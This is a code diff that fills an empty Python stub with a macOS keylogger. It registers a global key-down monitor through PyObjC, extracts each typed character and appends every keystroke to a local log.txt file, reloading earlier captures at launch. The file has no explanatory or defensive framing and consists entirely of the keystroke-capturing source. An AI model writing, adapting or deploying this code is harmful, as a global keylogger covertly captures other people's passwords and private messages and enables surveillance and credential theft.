@@ -1,28 +1,42 @@
-"""MAC"""
+from AppKit import NSApplication, NSApp
+from Foundation import NSObject, NSLog
+from Cocoa import NSEvent, NSKeyDownMask
+from PyObjCTools import AppHelper
+import os.path
 
+lines = []
+class AppDelegate(NSObject):
+    def applicationDidFinishLaunching_(self, notification):
+        mask = NSKeyDownMask
+        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)
 
+def handler(event):
+    try:
+        response = "{}".format(event)
+        chars = response.split("chars=\"")
+        c = chars[1][0]
+        lines.append('{}'.format(c))
+        f = open('log.txt', 'w')
+        for l in lines:
+            f.write(l)
+        f.close()
+    except KeyboardInterrupt:
+        AppHelper.stopEventLoop()
 
+def main():
+    app = NSApplication.sharedApplication()
+    delegate = AppDelegate.alloc().init()
+    NSApp().setDelegate_(delegate)
+    AppHelper.runEventLoop()
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+if __name__ == '__main__':
+    if os.path.isfile('log.txt'):
+        fr = open('log.txt','r')
+        for l in fr.readlines():
+            lines.append(l)
+    else:
+        lines.append("")
+    main()
 
 
 
